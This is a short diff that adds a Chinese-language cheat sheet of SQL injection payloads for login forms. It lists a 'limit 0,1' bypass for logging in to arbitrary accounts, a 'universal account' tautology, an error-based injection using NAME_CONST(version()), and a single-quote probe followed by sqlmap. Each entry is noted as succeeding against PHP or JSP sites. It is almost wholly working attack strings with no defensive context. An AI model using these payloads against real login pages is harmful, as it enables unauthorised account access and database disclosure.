@@ -1,0 +1,15 @@
+（1）通过变化 limit 登录任意账号 -php、jsp成功
+用户名：1' or 1=1 limit 0,1#
+密码：a
+
+（2）万能账号 - jsp成功
+账号：1' or 1=1 or '1'='1
+密码：a
+
+（3）盲注 - 基于报错 -php成功
+用户名：1' and 1=(select * from (select name_CONST(version(),1),NAME_CONST(version(),1)) as x)#
+密码： a
+
+(4)用户名密码输入单引号点击登录无回显，抓包服务端返回500 -》sqlmap -php成功
+用户民： '
+密码： '
